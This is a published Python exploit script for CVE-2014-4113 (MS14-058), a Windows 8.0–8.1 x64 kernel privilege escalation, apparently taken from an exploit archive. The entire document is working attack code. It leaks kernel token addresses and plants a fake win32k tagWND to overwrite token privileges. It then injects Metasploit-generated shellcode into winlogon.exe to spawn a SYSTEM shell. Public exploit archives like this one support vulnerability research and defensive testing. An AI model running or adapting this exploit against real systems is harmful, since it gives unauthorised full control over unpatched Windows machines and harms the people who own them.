# Windows 8.0 - 8.1 x64 TrackPopupMenu Privilege Escalation (MS14-058)
# CVE-2014-4113 Privilege Escalation
# http://www.offensive-security.com
# Thx to Moritz Jodeit for the beautiful writeup
# http://www.exploit-db.com/docs/35152.pdf
# Target OS Windows 8.0 - 8.1 x64
# Author: Matteo Memelli ryujin <at> offensive-security.com

# EDB Note: Swapping the shellcode for a bind or reverse shell will BSOD the machine.

from ctypes import *
from ctypes.wintypes import *
import struct, sys, os, time, threading, signal

ULONG_PTR = PVOID = LPVOID
HCURSOR = HICON
PDWORD = POINTER(DWORD)
PQWORD = POINTER(LPVOID)
LRESULT = LPVOID
UCHAR = c_ubyte
QWORD = c_ulonglong
CHAR = c_char
NTSTATUS = DWORD
MIIM_STRING  = 0x00000040
MIIM_SUBMENU = 0x00000004
WH_CALLWNDPROC = 0x4
GWLP_WNDPROC = -0x4
NULL = 0x0
SystemExtendedHandleInformation = 64
ObjectDataInformation = 2
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_BUFFER_OVERFLOW = 0x80000005L
STATUS_INVALID_HANDLE = 0xC0000008L
STATUS_BUFFER_TOO_SMALL = 0xC0000023L
STATUS_SUCCESS = 0
TOKEN_ALL_ACCESS = 0xf00ff
DISABLE_MAX_PRIVILEGE = 0x1
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM  = ( 0x1000 | 0x2000 )
TH32CS_SNAPPROCESS = 0x02

WinFunc1 = WINFUNCTYPE(LPVOID, INT, WPARAM, LPARAM)
WinFunc2 = WINFUNCTYPE(HWND, LPVOID, INT, WPARAM, LPARAM)
WNDPROC  = WINFUNCTYPE(LPVOID, HWND, UINT, WPARAM, LPARAM)

bWndProcFlag = False
bHookCallbackFlag = False
EXPLOITED = False
Hmenu01 = Hmenu02 = None

# /*
#  * windows/x64/exec - 275 bytes
#  * http://www.metasploit.com
#  * VERBOSE=false, PrependMigrate=false, EXITFUNC=thread,
#  * CMD=cmd.exe
#  */
SHELLCODE = (
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
"\x2e\x65\x78\x65\x00")

class LSA_UNICODE_STRING(Structure):
    """Represent the LSA_UNICODE_STRING on ntdll."""
    _fields_ = [
        ("Length", USHORT),
        ("MaximumLength", USHORT),
        ("Buffer", LPWSTR),
    ]

class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    """Represent the SYSTEM_HANDLE_TABLE_ENTRY_INFO on ntdll."""
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", PVOID),
        ("HandleValue", PVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]

class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    """Represent the SYSTEM_HANDLE_INFORMATION on ntdll."""
    _fields_ = [
        ("NumberOfHandles", PVOID),
        ("Reserved", PVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]

class PUBLIC_OBJECT_TYPE_INFORMATION(Structure):
    """Represent the PUBLIC_OBJECT_TYPE_INFORMATION on ntdll."""
    _fields_ = [
        ("Name", LSA_UNICODE_STRING),
        ("Reserved", ULONG * 22),
    ]

class MENUITEMINFO(Structure):
    """Contains information about a menu item."""
    _fields_ = [
        ("cbSize"       , UINT),
        ("fMask"        , UINT),
        ("fType"        , UINT),
        ("fState"       , UINT),
        ("wID"          , UINT),
        ("hSubMenu"     , HMENU),
        ("hbmpChecked"  , HBITMAP),
        ("hbmpUnchecked", HBITMAP),
        ("dwItemData"   , ULONG_PTR),
        ("dwTypeData"   , LPWSTR),
        ("cch"          , UINT),
        ("hbmpItem"     , HBITMAP),
    ]

class WNDCLASS(Structure):
    """Contains the window class attributes that are registered by the
       RegisterClass function."""
    _fields_ = [
        ("style"        , UINT),
        ("lpfnWndProc"  , WNDPROC),
        ("cbClsExtra"   , INT),
        ("cbWndExtra"   , INT),
        ("hInstance"    , HINSTANCE),
        ("hIcon"        , HCURSOR),
        ("hCursor"      , HBITMAP),
        ("hbrBackground", HBRUSH),
        ("lpszMenuName" , LPWSTR),
        ("lpszClassName", LPWSTR),
    ]

class PROCESSENTRY32(Structure):
    """Describes an entry from a list of the processes residing in the system
       address space when a snapshot was taken."""
    _fields_ = [ ( 'dwSize' , DWORD ) ,
                 ( 'cntUsage' , DWORD) ,
                 ( 'th32ProcessID' , DWORD) ,
                 ( 'th32DefaultHeapID' , POINTER(ULONG)) ,
                 ( 'th32ModuleID' , DWORD) ,
                 ( 'cntThreads' , DWORD) ,
                 ( 'th32ParentProcessID' , DWORD) ,
                 ( 'pcPriClassBase' , LONG) ,
                 ( 'dwFlags' , DWORD) ,
                 ( 'szExeFile' , CHAR * MAX_PATH )
    ]

user32                                      = windll.user32
kernel32                                    = windll.kernel32
ntdll                                       = windll.ntdll
advapi32                                    = windll.advapi32

user32.PostMessageW.argtypes                = [HWND, UINT, WPARAM, LPARAM]
user32.PostMessageW.restype                 = BOOL
user32.DefWindowProcW.argtypes              = [HWND, UINT, WPARAM, LPARAM]
user32.DefWindowProcW.restype               = LRESULT
user32.UnhookWindowsHook.argtypes           = [DWORD, WinFunc1]
user32.UnhookWindowsHook.restype            = BOOL
user32.SetWindowLongPtrW.argtypes           = [HWND, DWORD, WinFunc2]
user32.SetWindowLongPtrW.restype            = LPVOID
user32.CallNextHookEx.argtypes              = [DWORD, DWORD, WPARAM, LPARAM]
user32.CallNextHookEx.restype               = LRESULT
user32.RegisterClassW.argtypes              = [LPVOID]
user32.RegisterClassW.restype               = BOOL
user32.CreateWindowExW.argtypes             = [DWORD, LPWSTR, LPWSTR, DWORD,
                                                INT, INT, INT, INT, HWND, HMENU,
                                                HINSTANCE, LPVOID]
user32.CreateWindowExW.restype              = HWND
user32.InsertMenuItemW.argtypes             = [HMENU, UINT, BOOL, LPVOID]
user32.InsertMenuItemW.restype              = BOOL
user32.DestroyMenu.argtypes                 = [HMENU]
user32.DestroyMenu.restype                  = BOOL
user32.SetWindowsHookExW.argtypes           = [DWORD, WinFunc1, DWORD, DWORD]
user32.SetWindowsHookExW.restype            = BOOL
user32.TrackPopupMenu.argtypes              = [HMENU, UINT, INT, INT, INT, HWND,
                                                DWORD]
user32.TrackPopupMenu.restype               = BOOL
advapi32.OpenProcessToken.argtypes          = [HANDLE, DWORD , POINTER(HANDLE)]
advapi32.OpenProcessToken.restype           = BOOL
advapi32.CreateRestrictedToken.argtypes     = [HANDLE, DWORD, DWORD, DWORD,
                                                DWORD, DWORD, DWORD, DWORD,
                                                POINTER(HANDLE)]
advapi32.CreateRestrictedToken.restype      = BOOL
advapi32.AdjustTokenPrivileges.argtypes     = [HANDLE, BOOL, DWORD, DWORD,
                                                DWORD, DWORD]
advapi32.AdjustTokenPrivileges.restype      = BOOL
advapi32.ImpersonateLoggedOnUser.argtypes   = [HANDLE]
advapi32.ImpersonateLoggedOnUser.restype    = BOOL
kernel32.GetCurrentProcess.restype          = HANDLE
kernel32.WriteProcessMemory.argtypes        = [HANDLE, QWORD, LPCSTR, DWORD,
                                                POINTER(LPVOID)]
kernel32.WriteProcessMemory.restype         = BOOL
kernel32.OpenProcess.argtypes               = [DWORD, BOOL, DWORD]
kernel32.OpenProcess.restype                = HANDLE
kernel32.VirtualAllocEx.argtypes            = [HANDLE, LPVOID, DWORD, DWORD,
                                                DWORD]
kernel32.VirtualAllocEx.restype             = LPVOID
kernel32.CreateRemoteThread.argtypes        = [HANDLE, QWORD, UINT, QWORD,
                                                LPVOID, DWORD, POINTER(HANDLE)]
kernel32.CreateRemoteThread.restype         = BOOL
kernel32.CreateToolhelp32Snapshot.argtypes  = [DWORD, DWORD]
kernel32.CreateToolhelp32Snapshot.restype   = HANDLE
kernel32.CloseHandle.argtypes               = [HANDLE]
kernel32.CloseHandle.restype                = BOOL
kernel32.Process32First.argtypes            = [HANDLE, POINTER(PROCESSENTRY32)]
kernel32.Process32First.restype             = BOOL
kernel32.Process32Next.argtypes             = [HANDLE, POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype              = BOOL
kernel32.GetCurrentThreadId.restype         = DWORD
ntdll.NtAllocateVirtualMemory.argtypes      = [HANDLE, LPVOID, ULONG, LPVOID,
                                                ULONG, DWORD]
ntdll.NtAllocateVirtualMemory.restype       = NTSTATUS
ntdll.NtQueryObject.argtypes                = [HANDLE, DWORD,
                                        POINTER(PUBLIC_OBJECT_TYPE_INFORMATION),
                                        DWORD, DWORD]
ntdll.NtQueryObject.restype = NTSTATUS
ntdll.NtQuerySystemInformation.argtypes     = [DWORD,
                                        POINTER(SYSTEM_HANDLE_INFORMATION_EX),
                                        DWORD, POINTER(DWORD)]
ntdll.NtQuerySystemInformation.restype      = NTSTATUS


def log(msg, e=None):
    if e == "e":
        msg = "[!] " + msg
    if e == "d":
        msg = "[*] " + msg
    else:
        msg = "[+] " + msg
    print msg


def getLastError():
    """Format GetLastError"""

    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
            kernel32.GetLastError(), 0,
            buf, sizeof(buf), NULL):
        log(buf.value, "e")
    else:
        log("Unknown Error", "e")


class x_file_handles (Exception):
    pass


def get_type_info(handle):
    """Get the handle type information."""

    public_object_type_information = PUBLIC_OBJECT_TYPE_INFORMATION()
    size = DWORD(sizeof(public_object_type_information))
    while True:
        result = ntdll.NtQueryObject(handle, ObjectDataInformation,
                    byref(public_object_type_information), size, 0x0)
        if result == STATUS_SUCCESS:
            return public_object_type_information.Name.Buffer
        elif result == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(public_object_type_information, size.value)
        elif result == STATUS_INVALID_HANDLE:
            return "INVALID HANDLE: %s" % hex(handle)
        else:
            raise x_file_handles("NtQueryObject", hex(result))


def get_handles():
    """Return all the open handles in the system"""

    system_handle_information = SYSTEM_HANDLE_INFORMATION_EX()
    size = DWORD (sizeof (system_handle_information))
    while True:
        result = ntdll.NtQuerySystemInformation(
            SystemExtendedHandleInformation,
            byref(system_handle_information),
            size,
            byref(size)
        )
        if result == STATUS_SUCCESS:
            break
        elif result == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(system_handle_information, size.value)
        else:
            raise x_file_handles("NtQuerySystemInformation", hex(result))

    pHandles = cast(
        system_handle_information.Handles,
        POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * \
                system_handle_information.NumberOfHandles)
    )
    for handle in pHandles.contents:
        yield handle.UniqueProcessId, handle.HandleValue, handle.Object


def WndProc(hwnd, message, wParam, lParam):
    """Window procedure"""

    global bWndProcFlag
    if message == 289 and not bWndProcFlag:
        bWndProcFlag = True
        user32.PostMessageW(hwnd, 256, 40, 0)
        user32.PostMessageW(hwnd, 256, 39, 0)
        user32.PostMessageW(hwnd, 513, 0, 0)
    return user32.DefWindowProcW(hwnd, message, wParam, lParam)


def hook_callback_one(code, wParam, lParam):
    """Sets a new address for the window procedure"""

    global bHookCallbackFlag
    if ((cast((lParam+sizeof(HANDLE)*2),PDWORD)).contents).value == 0x1eb and\
     not bHookCallbackFlag:
        bHookCallbackFlag = True
        if user32.UnhookWindowsHook(WH_CALLWNDPROC, CALLBACK01):
            # Sets a new address for the window procedure
            log("Callback triggered!")
            log("Setting the new address for the window procedure...")
            lpPrevWndFunc = user32.SetWindowLongPtrW\
             ((cast((lParam+sizeof(HANDLE)*3),PDWORD).contents).value,
               GWLP_WNDPROC, CALLBACK02)
    return user32.CallNextHookEx(0, code, wParam, lParam)


def hook_callback_two(hWnd, Msg, wParam, lParam):
    """Once called will return the fake tagWND address"""

    global EXPLOITED
    user32.EndMenu()
    EXPLOITED = True
    log("Returning the fake tagWND and overwriting token privileges...")
    return 0x00000000FFFFFFFB


def buildMenuAndTrigger():
    """Create menus and invoke TrackPopupMenu"""

    global Hmenu01, Hmenu02
    log("Creating windows and menus...")
    wndClass = WNDCLASS()
    wndClass.lpfnWndProc = WNDPROC(WndProc)
    wndClass.lpszClassName = u"pwned"
    wndClass.cbClsExtra = wndClass.cbWndExtra = 0

    # Registering Class
    if not user32.RegisterClassW(addressof(wndClass)):
        log("RegisterClassW failed", "e")
        sys.exit()

    # Creating the Window
    hWnd = user32.CreateWindowExW(0, u"pwned", u"pwned", 0, -1, -1, 0,
                                  0, NULL, NULL, NULL, NULL)

    if not hWnd:
        log("CreateWindowExW Failed", "e")
        sys.exit()

    # Creating popup menu
    user32.CreatePopupMenu.restype = HMENU
    Hmenu01 = user32.CreatePopupMenu()
    if not Hmenu01:
        log("CreatePopupMenu failed 0x1", "e")
        sys.exit()
    Hmenu01Info = MENUITEMINFO()
    Hmenu01Info.cbSize = sizeof(MENUITEMINFO)
    Hmenu01Info.fMask = MIIM_STRING

    # Insert first menu
    if not user32.InsertMenuItemW(Hmenu01, 0, True, addressof(Hmenu01Info)):
        log("Error in InsertMenuItema 0x1", "e")
        user32.DestroyMenu(Hmenu01)
        sys.exit()

    # Creating second menu
    Hmenu02 = user32.CreatePopupMenu()
    if not Hmenu02:
        log("CreatePopupMenu failed 0x2", "e")
        sys.exit()
    Hmenu02Info = MENUITEMINFO()
    Hmenu02Info.cbSize = sizeof(MENUITEMINFO)
    Hmenu02Info.fMask = (MIIM_STRING | MIIM_SUBMENU)
    Hmenu02Info.dwTypeData = ""
    Hmenu02Info.cch = 1
    Hmenu02Info.hSubMenu = Hmenu01

    # Insert second menu
    if not user32.InsertMenuItemW(Hmenu02, 0, True, addressof(Hmenu02Info)):
        log("Error in InsertMenuItema 0x2", "e")
        user32.DestroyMenu(Hmenu01)
        user32.DestroyMenu(Hmenu01)
        sys.exit()

    # Set window callback
    tid = kernel32.GetCurrentThreadId()
    if not user32.SetWindowsHookExW(WH_CALLWNDPROC, CALLBACK01, NULL, tid):
        log("Failed SetWindowsHookExA 0x1", "e")
        sys.exit()

    # Crash it!
    log("Invoking TrackPopupMenu...")
    user32.TrackPopupMenu(Hmenu02, 0, -10000, -10000, 0, hWnd, NULL)


def alloctagWND():
    """Allocate a fake tagWND in userspace at address 0x00000000fffffff0"""

    hProcess = HANDLE(kernel32.GetCurrentProcess())
    hToken = HANDLE()
    hRestrictedToken = HANDLE()

    if not advapi32.OpenProcessToken(hProcess,TOKEN_ALL_ACCESS, byref(hToken)):
        log("Could not open current process token", "e")
        getLastError()
        sys.exit()
    if not advapi32.CreateRestrictedToken(hToken, DISABLE_MAX_PRIVILEGE, 0, 0,
                                    0, 0, 0, 0, byref(hRestrictedToken)):
        log("Could not create the restricted token", "e")
        getLastError()
        sys.exit()
    if not advapi32.AdjustTokenPrivileges(hRestrictedToken, 1, NULL, 0,
                                          NULL, NULL):
        log("Could not adjust privileges to the restricted token", "e")
        getLastError()
        sys.exit()

    # Leak Token addresses in kernel space
    log("Leaking token addresses from kernel space...")
    for pid, handle, obj in get_handles():
        if pid==os.getpid() and get_type_info(handle) == "Token":
            if hToken.value == handle:
                log("Current process token address: %x" % obj)
            if hRestrictedToken.value == handle:
                log("Restricted token address: %x" % obj)
                RestrictedToken = obj

    CurrentProcessWin32Process = "\x00"*8
    # nt!_TOKEN+0x40 Privileges : _SEP_TOKEN_PRIVILEGES
    # +0x3 overwrite Enabled in _SEP_TOKEN_PRIVILEGES, -0x8 ADD RAX,0x8
    TokenAddress = struct.pack("<Q", RestrictedToken+0x40+0x3-0x8)
    tagWND = "\x41"*11 + "\x00\x00\x00\x00" +\
     "\x42"*0xC + "\xf0\xff\xff\xff\x00\x00\x00\x00" +\
     "\x00"*8 +\
     "\x43"*0x145 + CurrentProcessWin32Process + "\x45"*0x58 +\
     TokenAddress + "\x47"*0x28
    ## Allocate space for the input buffer
    lpBaseAddress = LPVOID(0x00000000fffffff0)
    Zerobits      = ULONG(0)
    RegionSize    = LPVOID(0x1000)
    written       = LPVOID(0)
    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffffffffffff,
                                             byref(lpBaseAddress),
                                             0x0,
                                             byref(RegionSize),
                                             VIRTUAL_MEM,
                                             PAGE_EXECUTE_READWRITE)
    if dwStatus != STATUS_SUCCESS:
        log("Failed to allocate tagWND object", "e")
        getLastError()
        sys.exit()

    # Copy input buffer to the fake tagWND
    nSize = 0x200
    written = LPVOID(0)
    lpBaseAddress = QWORD(0x00000000fffffff0)
    dwStatus = kernel32.WriteProcessMemory(0xffffffffffffffff,
                                           lpBaseAddress,
                                           tagWND,
                                           nSize,
                                           byref(written))
    if dwStatus == 0:
        log("Failed to copy the input buffer to the tagWND object", "e")
        getLastError()
        sys.exit()

    log("Fake win32k!tagWND allocated, written %d bytes to 0x%x" %\
     (written.value, lpBaseAddress.value))
    return hRestrictedToken


def injectShell(hPrivilegedToken):
    """Impersonate privileged token and inject shellcode into winlogon.exe"""

    while not EXPLOITED:
        time.sleep(0.1)
    log("-"*70)
    log("Impersonating the privileged token...")
    if not advapi32.ImpersonateLoggedOnUser(hPrivilegedToken):
        log("Could not impersonate the privileged token", "e")
        getLastError()
        sys.exit()

    # Get winlogon.exe pid
    pid = getpid("winlogon.exe")

    # Get a handle to the winlogon process we are injecting into
    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

    if not hProcess:
        log("Couldn't acquire a handle to PID: %s" % pid, "e")
        sys.exit()

    log("Obtained handle 0x%x for the winlogon.exe process" % hProcess)

    # Creating shellcode buffer to inject into the host process
    sh = create_string_buffer(SHELLCODE, len(SHELLCODE))
    code_size = len(SHELLCODE)

    # Allocate some space for the shellcode (in the program memory)
    sh_address = kernel32.VirtualAllocEx(hProcess, 0, code_size, VIRTUAL_MEM,
                                         PAGE_EXECUTE_READWRITE)
    if not sh_address:
        log("Could not allocate shellcode in the remote process")
        getLastError()
        sys.exit()

    log("Allocated memory at address 0x%x" % sh_address)

    # Inject shellcode in to winlogon.exe process space
    written = LPVOID(0)
    shellcode = QWORD(sh_address)
    dwStatus = kernel32.WriteProcessMemory(hProcess, shellcode, sh, code_size,
                                            byref(written))
    if not dwStatus:
        log("Could not write shellcode into winlogon.exe", "e")
        getLastError()
        sys.exit()

    log("Injected %d bytes of shellcode to 0x%x" % (written.value, sh_address))

    # Now we create the remote thread and point its entry routine to be head of
    # our shellcode
    thread_id = HANDLE(0)
    if not kernel32.CreateRemoteThread(hProcess, 0, 0, sh_address, 0, 0,
                                        byref(thread_id)):
        log("Failed to inject shellcode into winlogon.exe")
        sys.exit(0)

    log("Remote thread  0x%08x created" % thread_id.value)
    log("Spawning SYSTEM shell...")
    # Kill python process to kill the window and avoid BSODs
    os.kill(os.getpid(), signal.SIGABRT)


def getpid(procname):
    """ Get Process Pid by procname """

    pid = None
    try:
        hProcessSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        pe32 = PROCESSENTRY32()
        pe32.dwSize = sizeof(PROCESSENTRY32)
        ret = kernel32.Process32First(hProcessSnap , byref(pe32))
        while ret:
            if pe32.szExeFile == LPSTR(procname).value:
                pid = pe32.th32ProcessID
            ret = kernel32.Process32Next(hProcessSnap, byref(pe32))
        kernel32.CloseHandle ( hProcessSnap )
    except Exception, e:
        log(str(e), "e")
    if not pid:
        log("Could not find %s PID" % procname)
        sys.exit()
    return pid


CALLBACK01 = WinFunc1(hook_callback_one)
CALLBACK02 = WinFunc2(hook_callback_two)


if __name__ == '__main__':
    log("MS14-058 Privilege Escalation - ryujin <at> offensive-security.com",
        "d")
    # Prepare the battlefield
    hPrivilegedToken = alloctagWND()
    # Start the injection thread
    t1 = threading.Thread(target=injectShell, args = (hPrivilegedToken,))
    t1.daemon = False
    t1.start()
    # Trigger the vuln
    buildMenuAndTrigger()